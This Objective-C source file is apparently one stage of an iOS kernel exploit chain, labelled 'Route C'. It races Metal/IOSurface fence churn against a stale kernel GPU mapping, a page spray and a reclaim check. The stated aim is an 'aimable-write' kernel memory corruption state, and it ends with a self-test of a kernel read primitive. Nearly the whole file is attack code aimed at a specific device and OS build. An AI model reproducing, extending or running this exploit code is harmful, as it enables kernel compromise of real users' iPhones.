//
//  P136RouteC.m — ROUTE C: fence churn x the stale-GVA reclaim kick.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Composition: thread A = the p127 fence churn body (recycle@8; the
//  engine-driven teardown/drain/append path that aborted 3x at
//  0x984fcc8), thread B = the b1b2 lab phases IN ORDER while A runs:
//    phase1 map + latch   (the kernel-side GVA binding to our pages)
//    phase2 unmap + spray (the reclaim precondition, 0x4000 pages)
//    phase3 latched kick  (the submit engine, +0x10=0 = the NQ law)
//    phase4 verify reclaim(who won the block)
//  Verdict law: phase4 reporting a NON-OWN page reclaiming the stale
//  block while the fence machinery churns = the aimable-write candidate
//  state; the .ips timing anchors any panic to this session.
//

#import "P136RouteC.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007KreadLane.h"
#import "P007Board.h"
#import "LabBandit.h"
#import "B1_B2_LabTest.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <stdarg.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P136_BUILD   @"p136-routec-v1"
#define P136_SURF_W  64
#define P136_SURF_H  64
#define P136_RECYCLE 8
#define P136_WATCH_S 30

typedef void *(*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(void *);

static NSString *P136R(void);

static NSMutableString *g_buf;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }

static atomic_int g_stop;
static atomic_ulong ga_rounds, ga_commits, ga_recycles, ga_fails;
static CFMutableDictionaryRef g_dict;
static IOSurfaceCreate_t  g_surfCreate;
static IOSurfaceGetID_t   g_surfID;

static void *p136_fencer(void *u) {
    (void)u;
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { atomic_fetch_add(&ga_fails, 1); return NULL; }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    if (!q) { atomic_fetch_add(&ga_fails, 1); return NULL; }
    MTLTextureDescriptor *td =
        [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:
         MTLPixelFormatBGRA8Unorm width:P136_SURF_W height:P136_SURF_H mipmapped:NO];
    td.storageMode = MTLStorageModeShared;
    unsigned long r = 0;
    void *surfaces[2] = { NULL, NULL };
    id<MTLTexture> tex[2] = { NULL, NULL };
    while (!atomic_load(&g_stop)) {
        @autoreleasepool {
            if (r % P136_RECYCLE == 0) {
                for (int k = 0; k < 2; k++) {
                    if (tex[k]) tex[k] = NULL;
                    if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
                }
                for (int k = 0; k < 2; k++) {
                    void *s = g_surfCreate(g_dict);
                    if (!s) { atomic_fetch_add(&ga_fails, 1); continue; }
                    tex[k] = [dev newTextureWithDescriptor:td
                                                 iosurface:(IOSurfaceRef)s plane:0];
                    surfaces[k] = s;
                    if (!tex[k]) atomic_fetch_add(&ga_fails, 1);
                }
                atomic_fetch_add(&ga_recycles, 1);
            }
            if (!tex[0] || !tex[1]) { r++;
              [NSThread sleepForTimeInterval:0.01]; continue; }
            id<MTLCommandBuffer> cb = [q commandBuffer];
            id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
            [e copyFromTexture:tex[0] sourceSlice:0 sourceLevel:0
               sourceOrigin:MTLOriginMake(0,0,0)
               sourceSize:MTLSizeMake(P136_SURF_W, P136_SURF_H, 1)
               toTexture:tex[1] destinationSlice:0 destinationLevel:0
               destinationOrigin:MTLOriginMake(0,0,0)];
            [e endEncoding]; [cb commit]; [cb waitUntilCompleted];
            atomic_fetch_add(&ga_commits, 1);
            r++; atomic_store(&ga_rounds, r);
        }
    }
    for (int k = 0; k < 2; k++) {
        if (tex[k]) tex[k] = NULL;
        if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
    }
    return NULL;
}

static void p136_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p136", arms, 1, &sr, 0, "p136 routeC auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p136", 0, outcome);
}

@implementation P136RouteC

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p136_routec_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p136 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P136_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[route C law] the third reclaim window: the b1b2 stale GVA (kernel");
    L(@"  GPU mapping bound to OUR pages) + reclaim + the latched kick,");
    L(@"  with the fence machinery churn live = the aimable-write state.");
    L(@"[!] PANIC-POSSIBLE; one tap per force-quit.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p136"];
    if (stop) { L(stop); p136_bandit("gated"); return P136R(); }

    void *iosf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosf) { L(@"[-] STOP dlopen"); p136_bandit("nodlopen"); return P136R(); }
    g_surfCreate = (IOSurfaceCreate_t)dlsym(iosf, "IOSurfaceCreate");
    g_surfID     = (IOSurfaceGetID_t)dlsym(iosf, "IOSurfaceGetID");
    if (!g_surfCreate || !g_surfID) { L(@"[-] STOP dlsym"); p136_bandit("nodlsym"); return P136R(); }
    g_dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int32_t w = P136_SURF_W, h = P136_SURF_H, bpe = 4, bpr = w * 4,
            as = w * h * 4;
    CFNumberRef n[5];
    const int32_t vv[5] = { w, h, bpe, bpr, as };
    const char *kk[5] = { "IOSurfaceWidth", "IOSurfaceHeight",
        "IOSurfaceBytesPerElement", "IOSurfaceBytesPerRow", "IOSurfaceAllocSize" };
    for (int i = 0; i < 5; i++) {
        n[i] = CFNumberCreate(NULL, kCFNumberSInt32Type, &vv[i]);
        CFDictionarySetValue(g_dict, (__bridge CFStringRef)
            [NSString stringWithUTF8String:kk[i]], n[i]);
        CFRelease(n[i]);
    }

    /* fence churn STARTS and runs for the WHOLE session */
    L(@"=== fence churn STARTS (live across all four phases) ===");
    L(@"[IN FLIGHT] route C pair live - one tap per force-quit.");
    unsigned long c0 = atomic_load(&ga_commits), r0 = atomic_load(&ga_rounds);
    atomic_store(&g_stop, 0);
    pthread_t ta;
    pthread_create(&ta, NULL, p136_fencer, NULL);

    /* the b1b2 engine, phase by phase */
    B1_B2_LabTest *lab = [B1_B2_LabTest sharedInstance];
    L(@"=== PHASE 1 map+latch (GVA binds to OUR pages) ===");
    NSString *l1 = [lab phase1_mapAndLatch];
    if (l1.length) L(l1.length > 4500 ? [@"[head/truncated]\n" stringByAppendingString:
                        [l1 substringToIndex:4500]] : l1);
    L(@"=== PHASE 2 unmap+spray (the reclaim precondition) ===");
    NSString *l2 = [lab phase2_unmapAndReclaim];
    if (l2.length) L(l2.length > 2500 ? [@"[head/truncated]\n" stringByAppendingString:
                        [l2 substringToIndex:2500]] : l2);
    L(@"=== PHASE 3 latched kick (the submit engine; NQ law +0x10=0) ===");
    NSString *l3 = [lab phase3_latchedKick];
    if (l3.length) L(l3.length > 2500 ? [@"[head/truncated]\n" stringByAppendingString:
                        [l3 substringToIndex:2500]] : l3);
    L(@"=== PHASE 4 verify reclaim (who won the stale block?) ===");
    NSString *l4 = [lab phase4_verifyReclaim];
    if (l4.length) L(l4.length > 2500 ? [@"[head/truncated]\n" stringByAppendingString:
                        [l4 substringToIndex:2500]] : l4);
    if (l4 && ([l4 rangeOfString:@"own"].location != NSNotFound ||
               [l4 rangeOfString:@"reclaim"].location != NSNotFound))
        [l4 writeToFile:[docs stringByAppendingPathComponent:@"p136_phase4_snippet.txt"]
             atomically:YES encoding:NSUTF8StringEncoding error:nil];

    /* the late window: the delayed-abort/landing catcher */
    for (int t = 0; t < P136_WATCH_S; t += 10) {
        [NSThread sleepForTimeInterval:10];
        Lf(@"  [watch+%ds] fence: commits=%lu recycles=%lu fails=%lu", t,
           (unsigned long)atomic_load(&ga_commits),
           (unsigned long)atomic_load(&ga_recycles),
           (unsigned long)atomic_load(&ga_fails));
    }
    atomic_store(&g_stop, 1);
    pthread_join(ta, NULL);
    Lf(@"  churn summary: commits=%lu recycles=%lu fails=%lu | "
       @"survived=YES in-tap",
       atomic_load(&ga_commits) - c0,
       (unsigned long)atomic_load(&ga_recycles),
       (unsigned long)atomic_load(&ga_fails));

    /* honest KRW self-test tail */
    L(@"=== STAGE GATE (honest KRW self-test) ===");
    if (!P007LaneLive()) {
        L(@"  lane: CLOSED -> no receipt this session. Honest.");
        p136_bandit("lane-closed");
    } else {
        uint64_t kb = P007LaneKbase();
        if (kb && P007LaneKRead32(kb) == 0xfeedfacfULL) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)", kb);
            p136_bandit("selftest-read-pass");
        } else {
            L(@"  KRW SELF-TEST READ: FAIL/HOLD");
            p136_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [[P007Board shared] kreadSignal]);
    }
    L(@"  [read law] the phase4 verdict decides the route: non-own reclaim");
    L(@"  + fence churn live = aimable-write candidate; any post-session");
    L(@"  0x984fcc8-band panic anchors to this session by timing.");
    Lf(@"=== p136 end %@ ===", LabLocalMilitaryNow());
    return P136R();
}

static NSString *P136R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

@end